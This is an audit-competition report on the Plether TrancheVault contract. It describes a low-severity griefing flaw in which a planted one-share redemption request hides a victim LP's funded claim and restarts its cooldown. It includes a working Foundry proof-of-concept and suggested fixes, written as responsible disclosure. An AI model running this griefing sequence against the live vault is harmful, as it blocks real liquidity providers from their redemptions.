# \#99550 [SC-Low] Anyone can plant a zero-value redemption request in another LP's queue, hiding the LP's funded claim from the standard ERC-7540 surface and restarting its cooldown

**Submitted on Nov 14th 2026 at 06:41:03 UTC by @Valisthea for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99550
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Summary

`TrancheVault.requestRedeem(shares, controller, owner)` lets any share holder name **any** address as the controller of a redemption request. A one-share request is exempt from the minimum size (it is a full-balance exit of the requester), prices to zero at settlement and is refunded, and then sits at the head of the victim's redemption queue. From then on:

- the victim's standard ERC-7540 / ERC-4626 claim surface hides its own funded redemption: `maxRedeem(victim)` and `maxWithdraw(victim)` return 0, and `redeem` / `withdraw` revert with `ERC4626ExceededMaxRedeem`;
- the only call that advances the head, `claimRedeemRefund`, delivers the planted share to the victim and restarts the victim's one-hour cooldown on every share it holds, blocking its transfers and new redemption requests for an hour.

The vault's own interface documentation promises the opposite: deposit claims and redemption cancellations/refunds require `receiver == controller` "so share delivery cannot impose another account's cooldown or depend on an unsolicited receiver balance" (`packages/perps/src/interfaces/IAsyncTrancheVault.sol:12-14`). The protection is bypassed because the unsolicited delivery is set up through the `controller` argument of the request rather than the `receiver` argument of the claim.

## Details

1. **Any owner can choose the controller.** `requestRedeem` only authorizes the share owner (or its operator / allowance) and accepts any nonzero controller (`packages/perps/src/TrancheVault.sol:606-632`). The request is appended to the controller's redemption FIFO (`TrancheVault.sol:701-704`).
2. **One share is enough.** `_requireMinimumRedeemSize` waives the minimum when `shares == maxShares`, i.e. a full-balance exit (`TrancheVault.sol:1611-1618`). The griefer moves one share to a fresh address, which requests its entire one-share balance with the victim as controller.
3. **Settlement leaves a refundable head.** The one-share epoch quotes zero assets and is refunded rather than funded (`packages/perps/src/HousePool.sol:960-986`). It remains the head of the victim's queue until the victim reclaims it.
4. **The standard surface reads only the head.** `maxRedeem` and `maxWithdraw` read `controllerRedeemHead[controller]` (`TrancheVault.sol:1299-1311`), and `redeem` / `withdraw` claim the head and revert when its claimable amount is below the request (`TrancheVault.sol:1158-1162`). The victim's own, fully funded request queued behind the planted head is invisible and unclaimable through these functions.
5. **Clearing the head imposes a cooldown.** `claimRedeemRefund` requires `receiver == controller` and, when it returns shares, sets `lastDepositTime[receiver] = block.timestamp` before transferring them (`TrancheVault.sol:938-945`). The victim therefore receives the griefer's share and its whole wallet enters a fresh one-hour cooldown (`TransferDuringCooldown`, `maxRequestRedeem == 0`).

The explicit-id `claimRedeem(requestId, ...)` still pays, so funds are not lost; but integrations that rely on the standard ERC-7540/4626 functions (wallets, routers, aggregators reading `maxRedeem`) cannot see or claim the victim's redemption, and the documented route out of the situation imposes exactly the cross-account cooldown the interface says is impossible. The griefer can repeat the plant once per LP epoch for the cost of one share and gas.

## Impact

The vault fails to deliver its documented standard claim behaviour to the targeted LP: funded redemption assets are reported as zero and the standard claim reverts, and clearing the planted request locks the LP's remaining shares for an hour. No funds are stolen (the explicit-id claim pays), so this is filed as Low.

## Recommendation

Any one of the following closes the hole:

- Require the controller's consent when `controller != owner` in `requestRedeem`, for example that `owner` is an approved operator of `controller` (`isOperator[controller][owner]`), mirroring the receiver protection already applied to claims.
- Do not restart the receiver's cooldown when `claimRedeemRefund` returns shares the receiver never owned (or deliver refunded shares to the original share owner instead of the controller).
- Let the standard claim functions skip refundable heads (process the refund implicitly or advance to the first claimable request), so a zero-value planted request cannot hide later funded requests.

## Proof of Concept

## Proof of concept

Self-contained Foundry test at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It inherits only the repository's `BasePerpTest`, uses the release risk parameters and runs with no open trading positions (permissionless cached LP settlement).

### Steps

1. VICTIM, CONTROL_LP and GRIEFER deposit into the junior vault, claim their shares and wait out the one-hour cooldown.
2. GRIEFER transfers one share to a fresh address DUST, which calls `requestRedeem(1, VICTIM, DUST)`. The request becomes the head of VICTIM's redemption queue.
3. In the next epoch VICTIM and CONTROL_LP each request redemption of half their shares (same epoch).
4. One `settleLpEpoch(0, 0)` refunds the zero-value planted epoch and fully funds the real one.
5. Control: CONTROL_LP's `maxRedeem` reports its funded claim and `redeem` pays.
6. VICTIM's `maxRedeem` and `maxWithdraw` are 0, and `redeem(claimable)` reverts with `ERC4626ExceededMaxRedeem(VICTIM, claimable, 0)`.
7. `claimRedeemRefund(giftId, VICTIM, VICTIM)` returns the planted share and restarts VICTIM's cooldown: `maxRequestRedeem(VICTIM)` drops to 0 and `transfer` reverts `TransferDuringCooldown`.
8. Control: the explicit-id `claimRedeem(redeemId, ...)` still pays, so the funds exist, while the standard head stays blocked.

Save as `packages/perps/test/perps/accounting/close/UnsolicitedRedeemHeadPoC.t.sol` and run:

```bash
forge test --root packages/perps --match-path 'test/perps/accounting/close/UnsolicitedRedeemHeadPoC.t.sol' -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

contract UnsolicitedRedeemHeadPoC is BasePerpTest {

    address internal constant KEEPER0 = address(0xCAFE);
    address internal constant VICTIM = address(0x51C7);
    address internal constant CONTROL_LP = address(0xC0C0);
    address internal constant GRIEFER = address(0x6EEF);
    address internal constant DUST = address(0xD057);
    uint256 internal constant LP_ASSETS = 20_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
    }

    function setUp() public override {
        super.setUp();
        vm.deal(KEEPER0, 100 ether);
        vm.warp(vm.getBlockTimestamp() + 1 days + 3 hours);
        _refresh(1e8);
        require(!engine.isFadWindow() && !engine.isOracleFrozen(), "setup must start in a live session");
    }

    function _pythAt(uint256 price, uint256 publishTime) internal returns (bytes[] memory updateData) {
        bytes32[] memory feedIds = new bytes32[](2);
        feedIds[0] = bytes32(uint256(1));
        feedIds[1] = bytes32(uint256(2));
        baseMockPyth.setAllUniquePrices(feedIds, int64(int256(price)), 0, int32(-8), publishTime, publishTime - 1);
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _refresh(uint256 price) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _pythAt(price, vm.getBlockTimestamp());
        vm.prank(KEEPER0);
        router.updateMarkPrice(data);
    }

    function _settleFlat() internal {
        _refresh(engine.lastMarkPrice());
        pool.settleLpEpoch(0, 0); // no open positions: permissionless cached settlement
    }

    function _requestJuniorDeposit(address lp, uint256 assets) internal returns (uint256 requestId) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        requestId = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    function _activateLps() internal returns (uint256 victimShares, uint256 controlShares) {
        uint256 id = _requestJuniorDeposit(VICTIM, LP_ASSETS);
        require(_requestJuniorDeposit(CONTROL_LP, LP_ASSETS) == id, "same deposit epoch");
        require(_requestJuniorDeposit(GRIEFER, 1e6) == id, "same deposit epoch");
        vm.warp(juniorVault.depositEpochStart(id) + 1);
        _settleFlat();
        vm.prank(VICTIM);
        victimShares = juniorVault.claimDeposit(id, LP_ASSETS, VICTIM, VICTIM);
        vm.prank(CONTROL_LP);
        controlShares = juniorVault.claimDeposit(id, LP_ASSETS, CONTROL_LP, CONTROL_LP);
        vm.prank(GRIEFER);
        juniorVault.claimDeposit(id, 1e6, GRIEFER, GRIEFER);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // every activation-aged cooldown has elapsed
    }

    function test_UnsolicitedDustRedeemBlocksVictimStandardClaimsAndImposesCooldown() public {
        (uint256 victimShares, uint256 controlShares) = _activateLps();
        assertEq(juniorVault.controllerRedeemHead(VICTIM), 0, "victim starts with no redemption requests");

        // 1. The griefer moves one share to a fresh account, which requests its full balance with the victim as controller.
        vm.prank(GRIEFER);
        juniorVault.transfer(DUST, 1);
        vm.prank(DUST);
        uint256 giftId = juniorVault.requestRedeem(1, VICTIM, DUST);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), giftId, "unsolicited request became the victim's FIFO head");

        // 2. The victim and an untargeted control LP redeem half of their shares into the next epoch.
        vm.warp(pool.lpEpochStart(giftId) + 1);
        uint256 victimRedeem = victimShares / 2;
        uint256 controlRedeem = controlShares / 2;
        vm.prank(VICTIM);
        uint256 redeemId = juniorVault.requestRedeem(victimRedeem, VICTIM, VICTIM);
        vm.prank(CONTROL_LP);
        require(juniorVault.requestRedeem(controlRedeem, CONTROL_LP, CONTROL_LP) == redeemId, "same redeem epoch");
        assertGt(redeemId, giftId, "victim's own request is queued behind the planted head");

        // 3. One permissionless settlement refunds the zero-output planted epoch and fully funds the real one.
        vm.warp(pool.lpEpochStart(redeemId) + 1);
        _settleFlat();
        (,,,,,,,,, bool giftRefundEnabled) = juniorVault.redeemEpochs(giftId);
        assertTrue(giftRefundEnabled, "planted 1-share epoch priced to zero and became refundable");
        uint256 victimClaimable = juniorVault.claimableRedeemRequest(redeemId, VICTIM);
        assertEq(victimClaimable, victimRedeem, "victim's redemption is fully funded");
        assertGt(juniorVault.claimableRedeemAssets(redeemId, VICTIM), 0, "victim has funded USDG in escrow");

        // Control 1: the untargeted controller in the same epoch sees and claims through the standard surface.
        uint256 controlMax = juniorVault.maxRedeem(CONTROL_LP);
        assertEq(controlMax, controlRedeem, "control: maxRedeem reports the funded claim");
        vm.prank(CONTROL_LP);
        assertGt(juniorVault.redeem(controlMax, CONTROL_LP, CONTROL_LP), 0, "control: standard redeem pays");

        // 4. The victim's standard claim surface hides and rejects its own funded claim.
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "maxRedeem hides the victim's funded shares");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "maxWithdraw hides the victim's funded USDG");
        vm.prank(VICTIM);
        vm.expectRevert(
            abi.encodeWithSelector(
                bytes4(keccak256("ERC4626ExceededMaxRedeem(address,uint256,uint256)")), VICTIM, victimClaimable, uint256(0)
            )
        );
        juniorVault.redeem(victimClaimable, VICTIM, VICTIM);

        // 5. The only head-advancing action delivers the planted share and restarts the victim's wallet cooldown.
        uint256 snap = vm.snapshotState();
        uint256 lastBefore = juniorVault.lastDepositTime(VICTIM);
        assertGt(juniorVault.maxRequestRedeem(VICTIM), 0, "victim's remaining wallet shares are redeemable now");
        vm.prank(VICTIM);
        assertEq(juniorVault.claimRedeemRefund(giftId, VICTIM, VICTIM), 1, "acknowledgement returns the planted share");
        assertGt(juniorVault.lastDepositTime(VICTIM), lastBefore, "griefer's share restarted the victim's cooldown");
        assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "victim's remaining shares are locked for another hour");
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(address(0xBEEF), 1);
        vm.revertToState(snap);

        // Control 2: the non-standard explicit-id claim still pays, so the funds exist; the standard head stays blocked.
        vm.prank(VICTIM);
        assertGt(juniorVault.claimRedeem(redeemId, victimClaimable, VICTIM, VICTIM), 0, "explicit-id claim pays");
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "planted head still blocks every later standard claim");
    }

}
```

### Output (run locally at a82d4fef)

```
[PASS] test_UnsolicitedDustRedeemBlocksVictimStandardClaimsAndImposesCooldown() (gas: 2916143)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```
